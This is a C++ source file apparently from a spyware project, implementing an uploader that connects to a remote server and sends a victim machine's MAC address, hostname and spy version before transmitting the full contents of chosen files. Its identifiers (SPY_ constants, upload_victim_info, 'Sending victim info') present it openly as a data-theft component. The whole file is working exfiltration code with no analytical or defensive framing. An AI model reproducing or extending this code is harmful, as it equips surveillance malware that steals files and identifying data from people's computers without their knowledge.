#include "uploader.h"
#include "networking.h"

void Uploader::send_header(byte content_type, int content_length)
{
	LOG_D("Send header: type = %d, length = %d", content_type, content_length);
	socket->write(&content_type, 0, sizeof(byte));
	socket->write((const byte *)&content_length, 0, sizeof(int));
}

void Uploader::send_content(const byte * buffer, int offset, int length)
{
	LOG_D("Send %d content bytes...", length);
	socket->write(buffer, offset, length);
}

void Uploader::upload_mac()
{
	byte mac[6];
	sockaddr sock_addr = socket->get_sock_addr();
	in_addr addr;
	addr.S_un.S_addr = inet_addr(sock_addr.sa_data);
	if (Networking::get_mac_addr(mac, addr) != NULL)
	{
		LOG_I("Send MAC address: %02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
		send_header(SPY_UPL_HEADER_MAC, 6);
		send_content(mac, 0, 6);
	}
	else
	{
		throw 1;
	}
}

void Uploader::upload_hostname()
{
	char * hostname = new char[SPY_UPL_HOSTNAME_MAX];
	if (gethostname(hostname, SPY_UPL_HOSTNAME_MAX) == 0)
	{
		LOG_I("Send hostname: %s", hostname);
		int length = strlen(hostname);
		send_header(SPY_UPL_HEADER_HOSTN, length);
		send_content((const byte *)hostname, 0, length);
	}
	else
	{
		LOG_E("Can't gethostname: %d", errno);
	}
}

void Uploader::upload_victim_info()
{
	upload_mac();
	upload_spy_version();
	upload_hostname();
}

void Uploader::upload_spy_version()
{
	send_header(SPY_UPL_HEADER_VER, 3);
	const byte ver[] = { SPY_MAJOR_VERSION, SPY_MINOR_VERSION, SPY_REVISION };
	send_content(ver, 0, 3);
}

void Uploader::upload_file_data(FILE * file)
{
	byte buffer[SPY_IO_IN_SZBUFFER];
	fseek(file, 0, SEEK_SET);
	int length;
	while (!feof(file) && ((length = fread(buffer, 1, SPY_IO_IN_SZBUFFER, file)) > 0))
	{
		// send file data to server
		send_content(buffer, 0, length);
		// read response from server
		length = socket->read(buffer, 0, 1);
		// check response
		if (length <= 0 || buffer[0] == 0)
		{
			ignored = true;
			break;
		}
	}
}

void Uploader::upload_file(FILE * file)
{
	fseek(file, 0, SEEK_END);
	int length = ftell(file);

	send_header(SPY_UPL_HEADER_FILE, length);

	upload_file_data(file);
}

void Uploader::upload(const char * file_path)
{
	LOG_I("Open file '%s'", file_path);
	FILE * file = fopen(file_path, "r+b");
	if (file == NULL)
	{
		LOG_E("Can not open file '%s' for read: %d", file_path, errno);
		LOG_E("Ignored upload this file!");
		return;
	}
	__try
	{
		LOG_I("Sending '%s' to server....", file_path);
		upload_file(file);
		LOG_I("Sent!");
	}
	__finally
	{
		fclose(file);
	}
}

Uploader::Uploader(const char * server_addr, int server_port)
{
	LOG_I("Connect to %s:%d", server_addr, server_port);
	socket = new Socket(server_addr, server_port);
	LOG_I("Connected");
	LOG_I("Sending victim info...");
	upload_victim_info();
	LOG_I("Sent!");
}

Uploader::~Uploader()
{
	delete socket;
}
